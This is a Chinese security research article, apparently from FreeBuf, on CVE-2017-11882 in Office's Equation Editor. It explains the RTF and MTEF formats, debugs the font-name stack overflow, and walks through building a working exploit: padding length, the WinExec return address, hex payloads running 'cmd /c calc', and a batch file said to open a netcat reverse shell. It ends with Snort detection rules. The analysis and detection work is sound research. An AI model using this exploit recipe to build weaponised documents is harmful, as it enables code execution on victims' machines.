@@ -1,0 +1,147 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+摘要
+本文分析了CVE-2017-11882 poc样本的文件结构，在分析poc样本时介绍了rtf文件、Equation Native数据结构、MTEF流数据结构、FONT记录数据结构的基本知识。在分析完poc样本后，通过windbg、IDA分析、调试了漏洞。在漏洞调试分析的基础上给出了漏洞exploit编写过程。通过poc样本分析、漏洞调试、exploit编写等过程掌握了漏洞详情，提取了漏洞特征。根据漏洞特征及poc样本网络传输中的IP数据包分析，编写了针对CVE-2017-11882的漏洞利用入侵检测规则。在编写规则中总结了2条漏洞利用入侵检测规则的编写准则。
+1.漏洞介绍
+CVE-2017-11882漏洞在office处理公式时触发。Office公式为OLE对象，office在处理公式时会自动调用模块EQNEDT32.EXE来处理这类OLE对象。在EQNEDT32.EXE程序中，存在处理公式对象的字体tag时对字体名长度未验证的漏洞。漏洞导致栈溢出，可以覆盖函数的返回地址，从而执行恶意代码。
+2. 漏洞分析
+2.1.工具生成POC样本
+2.2.RTF结构基础知识
+RTF文件由未格式化本文、控制字、控制符和组组成，包含文件头和文档格式为：{ <header><document>}两部分。
+控制字最长32个字符。控制字的使用格式如下:
+\字母序列<分隔符>
+分隔符为：空格、数字、连接符“-”、任何非字母和数字的其他字符（此时字符不是控制字的部分）。
+控制字一般不含大写字母，但有部分例外。
+控制符由一个反斜线\跟随单个非字母字符组成。例如，\~代表一个不换行空格。控制符不需要分隔符。
+组由包括在一对大括号“{}”中的文本、控制字或控制符组成。左扩号“{”表示组的开始，右扩号“}”表示组的结束。
+字体、文件、格式、屏幕颜色、校订标记，以及摘要信息组、文档格式属性，一定要在文件的第一纯文本字符之前，字体组在格式组之前。这些组形成RTF的文件头。
+2.2.1. 文件头<header>
+RTF文件必须紧跟着左括号之后标明RTF版本号，RTF头部需要指定支持的字符集，字符集控制字必须在任何纯文本或任何表控制字之前。
+RTF头内容：
+RTF版本，\rtfN，如：\rtf1 字符集<charset>，如：\ansi UnicodeRTF ，用来执行Unicode向ANSI转换的ANSI代码页。如：\ansicpg1252 默认字体<deffont>，默认字体号\deff? ,如：\deff0 字体表<fonttbl> 文件表<filetbl>? 颜色表<colortbl>? 样式表<stylesheet>? 编目表<listtables>? 编目表{ \*\listtable } 编目替换表{ \*\listoverridetable } 段落组属性{ \*\pgptbl } 跟踪修订<revtbl>? RSID表<rsidtable>? 生成器信息<generator>?
+2.2.1.1. AnsicpgN定义字体
+如Ansicpg1252表示字体是拉丁文，1252是拉丁文字体在ansi中的页码。
+字体对应页码表：
+·874 (ANSI/OEM -泰文) ·932 (ANSI/OEM -日文Shift-JIS) ·936 (ANSI/OEM -简体中文GBK) ·949 (ANSI/OEM -韩文) ·950 (ANSI/OEM -繁体中文Big5) ·1250 (ANSI -中欧) ·1251 (ANSI -西里尔文) ·1252 (ANSI -拉丁文) ·1253 (ANSI -希腊文) ·1254 (ANSI -土耳其文) ·1255 (ANSI -希伯来文) ·1256 (ANSI -阿拉伯文) ·1257 (ANSI -波罗的海文) ·1258 (ANSI/OEM -越南)
+2.2.1.2. 生成器（\*\generator）
+为文档加上戳记，包括其名称、版本、生成号等。生成器区域使用如下语法：
+‘{‘ \*\generator <name> ‘;’ ‘}’，
+其中<name> #PCDATA，可以包括：程序名、版本、生成号以及其他与生成程序相关的能够列在这里的任何信息。该区域中只允许使用ASCII文本。
+生成器例子：
+{\*\generator Riched20 6.3.9600}
+2.2.2. 文档区<document>
+2.2.2.1. 文档区的语法
+<document> <info>? <docfmt>* <section>+
+文档区由信息组、文档格式属性、节文本、段落文本、字符文本、对象、图片等组成
+2.2.2.2. 信息组语法
+信息组（可以没有），控制字\info引入了信息组，信息组包含了文档的相关信息。这些信息包括：标题、作者、关键字、注释和文件的其它特定信息。
+2.2.2.3. 文档格式属性
+在信息组的后面(可以没有)，是一些文档格式控制字(在文档区语法描述中使用<docfmt>描述)。这些控制字指明了文档的属性，必须要在文档的第一个纯文本字符之前。
+如：\deflang1033（定义文档使用的默认语言），\viewkind4(定义文档视图模式)
+2.2.2.4. 段落文本属性
+段落有两种类型：纯文本和表。如：\pard\sa200\sl276\slmult1\f0\fs22\lang9
+2.2.2.5. 字符文本属性
+这些属性指定字体(字符)格式，重置文档语言。如：\f0\fs22\lang9
+2.2.2.6. 对象
+对象是一个包含数据和一个结果的目标引用。当对象为一个OLE嵌入对象或者链接对象时，其数据部分采用OLESaveToStream函数生成的结构体。
+如：\object\objemb，指定对象为嵌入式ole对象。
+\objupdate，强制对象在显示前更新。
+\objw，对象宽度
+Objh，对象高度
+2.3.EquationNative结构基础知识
+Equation Native流数据 = EQNOLEFILEHDR + MTEFData，其中
+MTEFData = MTEFheader + MTEF Byte Stream
+EQNOLEFILEHDR头结构（共28字节）
+struct EQNOLEFILEHDR{ WORD cbHdr; // 格式头长度，固定为0x1C（28字节）。 DWORD version; // 固定为0x00020000。 WORD cf; // 该公式对象的剪贴板格式。 DWORD cbObject; // MTEF数据的长度，不包括头部。 DWORD reserved1; // 未公开 DWORD reserved2; // 未公开 DWORD reserved3; // 未公开 DWORD reserved4; // 未公开 };
+MTEF header结构
+struct MTEF_HEADER { BYTE bMtefVersion; // MTEF版本号,一般为0x03 BYTE bPlatform; // 系统生成平台,0x00为Mac生成,0x01为Windows生成 BYTE bProduct; // 软件生成平台,0x00为MathType生成,0x01为公式编辑器生成 BYTE bProductVersion; // 产品主版本号 BYTE bProductSebVersion; // 产品副版本号 };
+MTEF Byte Stream的结构
+initial SIZE record：记录的初始SIZE PILE or LINE record：一个PILE或LINE record tag contents of PILE or LINE ：PILE或LINE的实际内容，往往是一个其他记录(记录见下表) END record：记录结束
+各种record的类别如下：
+其中FONT记录及FONT内容结构如下：
+struct stuFontRecord { BYTE bTag; // 字体文件的tag位0x08 BYTE bTypeFace; // 字体风格 BYTE bStyle; // 字体样式 BYTE bFontName[n] // 字体名称,以NULL为结束符 };
+字段 值 说明 Tag 0×08 1字节，固定为0×08 tface typeface number 1字节，Typeface编号 style 1或者2 1字节，1表示斜体，2表示粗体 name Font name (null-terminated) 字体名字，以Null结尾
+2.4. poc样本结构分析
+2.4.1. poc样本rtf结构分析
+{\rtf1\ansi\ansicpg1252\deff0{\fonttbl{\f0\fnil\fcharset0 Calibri;}} {\*\generatorRiched20 6.3.9600} //文件头,包含版本信息、字符集、支持字符、缺省字体、字体表、生成器 \deflang1033 \viewkind4 //文档区，信息组没有，文档格式属性 \pard\sa200\sl276\slmult1 //段落文本属性 \f0\fs22\lang9 //字符文本属性，然后下面是一个嵌入式对象，该对象//是一个公式对象 {\object\objemb\objupdate // 此处控制字\objupdate自动更新ole对象 {\*\objclassEquation.3} //此处说明是公式对象 \objw380\objh260{\*\objdata01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff09000600000000000000000000000100…. ….. //中间数据省略 …..0000000000000000000000000000000000000000000000000000000000000000000000000000 //以下数据是Equation Native流数据,此数据流下章节分析1c00000002009ec4a900000000000000c8a75c00c4ee5b0000000000030101030a0a01085a5a636d64202f632063616c63202641414141414141414141414141414141414141414141414141414141414141120c4300000000000000000000000000000000000000000048008a01ffffffff7cef1800040000002d01010004000000f0010000030000000000….//省略 } //对象区\result结果对象控制字，结果目标包含了该对象的最后更新结果。这样//允许那些不能识别对象或者不能使用该特定类型对象的旧的RTF阅读器使用当//前的对象值来替换该对象，从而保持其外观显示。 {\result{\pict{\*\picprop}\wmetafile8\picw380\pich260\picwgoal380\pichgoal260 ….//省略000f0010000030000000000}}} \par} //\par插入一个段落标志
+其中，\objupdate控制字来保证OLE对象的自动更新和加载，从而触发漏洞代码执行。默认状态下Office文档中的OLE Object需要用户双击才能生效。将OLE Object的属性为自动更新，这样无需交互，点击打开文档后OLE Object对象会生效，从而执行恶意代码。
+该poc是一个包含Equation Native对象的rtf,而恶意代码在Equation Native对象中。
+2.4.2. poc样本ole对象分析
+2.4.2.1. poc Equation Native对象分析
+2.4.2.1.1. 对文档提取ole对象
+2.4.2.1.2.查看ole对象的目录结构
+可以看到ole对象中包含了Equation Native对象
+2.4.2.1.3. 使用olebrowse查看Equation Native对象
+2.4.2.1.4. 样本Equation Native头
+结合Equation Native头结构，分析样本Equation Native头为：
+偏移量 变量名 说明 值 0-1 cbHdr 公式头大小 0x001C（28字节） 2-5 version 版本号 0x00020000 6-7 cf 剪贴板格式 0xC49E 8-11 cbObject MTEF数据长度 0xA9，即169字节 12-15 reserved1 未公开 0x00000000 16-19 reserved2 未公开 0x005CA7C8 20-23 reserved3 未公开 0x005BEEC4 24-27 reserved4 未公开 0x00000000
+2.4.2.1.5. poc MTEF header
+偏移量 说明 值 0 MTEF版本号 0x03 1 该数据的生成平台 0x01表示Windows平台生成 2 该数据的生成产品 0x01表示由公式编辑器生成 3 产品主版本号 0x03 4 产品副版本号 0x0A
+2.4.2.1.6. poc MTEF Byte Stream数据
+样本中前两字节是Font记录的初始size值（0a）,接着是一个line size记录（值为01），这是MTEF Byte Stream的结构要求。
+在这2字节后就是line记录内容，一个字体记录
+数值 解释 0x08 FONT记录标志 0x5a typeface类型 0x5a 字体风格 0x636D6420…… 字体名（以空字符结尾），即图9中的cmd.exe…字符串
+3. 漏洞分析
+3.1. 设置windbg调试EQNEDT32.exe
+启动注册表，在注册表项HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\EQNEDT32.EXE
+中设置debugger为windbg
+增加一个DWORD: DisableExceptionChainValidation 值为0
+增加一个字符串: debugger值为（调试器安装路径）：E:\WinDDK\7600.16385.1\Debuggers\windbg.exe
+3.2. 使用word打开poc文档调试
+Word打开test.rtf文档，处理公式时自动启动EQNEDT32.EXE，从而打开windbg调试程序
+3.3. 栈回溯漏洞分析
+3.3.1. 在WinExec设置断点
+因为windows调用外部命令一般使用winexec函数,在此处设置断点，bp Kernel32!WinExec
+3.3.2. 查看堆栈
+使用db esp命令查看当前堆栈数据，可以看到winexec后调用了计算器,说明是利用winexec执行了漏洞利用
+执行kb进行堆栈回溯
+WARNING: Stackunwind information not available. Following frames may be wrong. 0012f1cc 00430c180012f350 00000000 0012f1ec kernel32!WinExec 0012f210 004218e40012f350 0012f5e0 0012f7e4 EqnEdt32!MFEnumFunc+0x241b
+通过堆栈回溯我们可以看到触发WinExec调用的上级函数返回地址在：0x4218e4.
+通过使用IDA Pro逆向EQNEDT32.exe我们可以看到地址0x4218e4在函数sub_421774中，且是函数sub_4115A7函数调用后返回后程序执行指令地址。
+也就是说winexec由函数sub_4115A7调用，因此，在0x4218df设置断点，调试程序。
+重新读取poc
+设置断点，然后g执行
+0:000> bp 0x4218df
+查看堆栈信息,可以看到此时是将字体名字符串传递给函数sub_4115a7处理，此时EAX寄存器存储的是字体名称字符。Eax地址12f350
+此时EAX寄存器恰好是传递给函数sub_4115a7的参数，而值为MTEF字节流中Font结构体的字体名，说明函数处理的恰好是字体名数据。逆向sub_4115a7的结果为：
+BOOL __cdeclsub_4115A7(LPCSTR lpFontName) { CHAR String2; // [sp+Ch] [bp-24h]@2 return strlen(lpFontName) != 0 &&sub_41160F((char *)lpFontName, 0, (int)&String2) &&!lstrcmpA(lpFontName, &String2); }
+说明sub_4115A7函数调用sub_41160F将字体名复制到String2变量中。
+设置sub_4115a7调用完毕后的地址为断点，bp 4115d8，然后g执行，程序直接弹出计算器。说明函数sub_4115a7在执行完sub_41160F后没有正常返回。
+也就说明函数sub_41160F的返回地址被覆盖了。我们看逆向后的sub_41160F函数也可以说明前面的分析。
+int __cdeclsub_41160F(char *lpFontName, char *a2, int lpdstStr) { int result; // eax@12 char v4; // [sp+Ch] [bp-88h]@5 char cMtef_Byte_Stream; // [sp+30h][bp-64h]@4 __int16 v6; // [sp+51h] [bp-43h]@5 char *v7; // [sp+58h] [bp-3Ch]@7 int v8; // [sp+5Ch] [bp-38h]@1 __int16 nFontNameLen; // [sp+60h] [bp-34h]@1 int v10; // [sp+64h] [bp-30h]@1 __int16 v11; // [sp+68h] [bp-2Ch]@1 char v12; // [sp+6Ch] [bp-28h]@1 int v13; // [sp+90h] [bp-4h]@1 LOWORD(v13) = -1; LOWORD(v8) = -1; nFontNameLen = strlen(lpFontName); strcpy(&v12, lpFontName); //没有验证lpFontName长度 _strupr(&v12); v11 = sub_420FA0(); LOWORD(v10) = 0; while ( v11 > (signed __int16)v10 ) //处理MTEF byte stream { if ( read_MTEF_Byte_Stream(v10,&cMtef_Byte_Stream) ) { strcpy(&v4, &cMtef_Byte_Stream); if ( v6 == 1 ) _strupr(&v4); v7 = strstr(&v4, lpFontName); // 判断lpFontName是否v4的子串,由此推测if语句中的函数读取MTEF Byte Stream信息 if ( v7 || (v7 = strstr(&v4,&v12)) != 0 ) //如果MTEF byte stream包含字体名 { if ( !a2 || !strstr(&v4, a2) ) //本次函数未执行，因为a2=0 { if ( (signed__int16)strlen(&cMtef_Byte_Stream) == nFontNameLen ) { strcpy((char *)lpdstStr,&cMtef_Byte_Stream); return 1; } if ( v7 == &v4 ) LOWORD(v8) = v10; else LOWORD(v13) = v10; } } } LOWORD(v10) = v10 + 1; } //TEF byte stream读取结束 //本次poc中v8<0,所以只有“strcpy(&v12, lpFontName);”这个复制语句执行了，其他复制语句未执行。因此是由v12局部变量复制中未校验长度，导致v12复制数据覆盖了函数返回地址 if ( (signed __int16)v8 < 0 ) { if ( (signed __int16)v13 < 0 ) { result = 0; } else { read_MTEF_Byte_Stream(v13,&cMtef_Byte_Stream); strcpy((char *)lpdstStr,&cMtef_Byte_Stream); result = 1; } } else { read_MTEF_Byte_Stream(v8,&cMtef_Byte_Stream); strcpy((char *)lpdstStr, &cMtef_Byte_Stream); result= 1; } return result; }
+然后我们重新启动poc，先在4218df下断点，g执行,然后在函数sub_41160F内下断点
+bp 4218e4
+然后在4115d3处(此处调用sub_41160F函数)下断点，按g
+bp 4115d8,继续单步跟踪到函数sub_41160F,然后下断点,bp 411658
+查看此时的esi和edi数据，函数sub_41160F完成将[esi]中字体组字体名数据复制到[edi]中
+通过分析我们发现函数sub_41160F在411658处处理字体名称复制，并且字体名称复制完成后，字体名称字符串会覆盖函数的返回地址，而sub_41160F的返回指令为411874。我们在sub_41160F的返回指令处设置断点，然后观察函数返回后执行到何处。
+bp 411874 （在清除前面设置的断点后，bc * ）, style="color: rgb(255, 0, 0);">然后g执行，然后单步跟踪，可以看到函数sub_41160F返回时跳转到地址4c0312处。
+然后单步跟踪进入winexec进程，在地址75f5e6a5处，我们查看eax,可以看到传给函数的参数，包含了cmd /c calc.
+继续F10将弹出计算器
+3.4. poc构造
+根据前面漏洞分析及poc样本分析，我们开始自己的漏洞利用poc构建过程。漏洞发生在处理struct stuFontRecord结构体的bFontName[n]字段时。
+我们看程序给目标字符串分配的空间
+分配的空间是：0x28-0x4=0x24,也就是说覆盖超过0x24空间的长度后会产生溢出。而r程序返回地址在距dstStr：0x24+0x4+0x4=0x2c处，也就是在需要0x2c+4=48个字节，覆盖程序的返回地址，也就是96个字符组成的字符串。
+我们构造如下结果字符串
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+覆盖后字体部分如下：
+执行poc,可以看到此时ip指针刚好返回到bbbbbbbb,说明这个地方刚好覆盖函数的返回地址
+然后我们将bbbbbbbb替换成winexec地址，我们可以看到winexec地址在：0x430c12
+因此，我们将bbbbbbbb替换为：120c4300,替换后样本字体部分如下：
+执行样本会发现winexec已经执行，因为程序已经执行过地址：430C2F的指令
+然后将剩下部分替换为可执行命令(假设e:盘已存在一个名为test.bat的文件，该文件反向连接到攻击端，系统存在netcat程序)
+cmd /c e:/test.bat
+16进制转化后为：636d64202f6320653a2f746573742e6261742026，不够48字节（96字符）使用“41”填充。
+替换后poc字体部分如下：
+然后执行poc，攻击端信息如下：
+4.漏洞利用特征
+特征1：” \object\objemb\objupdate” ,自动更新嵌入式对象，触发恶意代码执行，在poc中偏移量0xD6 特征2：” \objclass Equation.3” ，公式对象，因为漏洞是微软公式处理漏洞,>2000（4708）字节后是特征3，偏移量是0x133A 特征3：” 1c0000000200” , Equation Native头不变部分,45个字节后是特征4，偏移量0x1345 特征4：”03或02或01”, MTEF版本号，6字节后是特征5，偏移量0x1372
+特征5：“08” ，字体tag,必须，50字节后是特征6,偏移量0x1380,字体tag后有2字节后才是字体名。由于rtf文件中字体名填充的字节是16进制形式表示，一个字节2个字符，因此时间字节数偏移量是 0x13e4-0x1380=100
+特征6：” |30|” , 字体名大于44长度后产生溢出，紧接着是4个字节的返回地址然后是空字节|30|,偏移量0x13e4
+5.协议分析及入侵检测规则编写
+通过IP包我们可以看到：漏洞特征分布在2个分片中，因此完整匹配漏洞需要进行流追踪，这里通过flowbits设置关键字来进行追踪。通过对IP包分析及前面漏洞特征我们针对漏洞编写如下检测规则（规则分为rtf文件、rtf文件objupdate流识别，rtf漏洞利用识别两个规则；因为snort实现对文件漏洞利用的检测需要先识别数据包是对应rtf类型的文件，及文件流中的”\objupdate”和“|5C|objclass Equation|2e|3”，然后才能识别漏洞利用真实攻击特征）：
+alert tcp$EXTERNAL_NET any -> $HOME_NET any (msg:"FILE-OFFICE Microsoft EquationNative autoupdate find--toserver"; flow:to_server,established;content:"|7b 5c 72 74 66|";content:"|5C|object|5C|objemb|5C|objupdate"; nocase;content:"|5C|objclass Equation|2e|3"; nocase; fast_pattern;flowbits:set,rtf_autoupdate; flowbits:noalert; metadata:policy balanced-ips drop,policy security-ips drop, service ftp-data, service http, service imap, servicepop3; reference:cve,2017-11882; classtype:misc-activity; sid:2018000009;rev:1;) alert tcp$EXTERNAL_NET any -> $HOME_NET any (msg:"FILE-OFFICE Microsoft EquationNative Fontname parsing buffer overflow attempt--toserver";flow:to_server,established; flowbits:isset,rtf_autoupdate;content:"1c0000000200"; pcre:"/(03|02|01)/";content:"08"; distance:6; content:"|30|"; distance:100;metadata:policy balanced-ips drop, policy security-ips drop, service ftp-data,service http, service imap, service pop3; reference:cve,2017-11882;classtype:attempted-user; sid:2018000010; rev:1;)
+6. 入侵检测试验效果
+我们使用上传poc rtf文件到ftp服务器，然后wireshark截取的数据包，进行重放，然后使用snort检测，检测结果如下：
+7. 两条漏洞利用入侵检测规则编写准则
+1) 漏洞利用入侵检测规则编写第一准则：针对漏洞特征编写漏洞利用入侵检测规则，而不是针对具体攻击。（如：我们本次的规则，针对的是漏洞特点：必须的对象，字体名长度超过48字节等。我们没有使用返回地址，也没有使用winexec\cmd等等具体命令，因为这些都可以变化。） 2) 漏洞利用入侵检测规则编写第二准则：如果需要针对攻击编写检测规则，就针对攻击模式编写入侵检测规则，而不是针对具体漏洞利用命令或语句。（准则二和准则一不矛盾，攻击模式本质上是漏洞条件的外在的表现模式。）
+*本文作者：cloud4986，转载请注明来自FreeBuf.CO
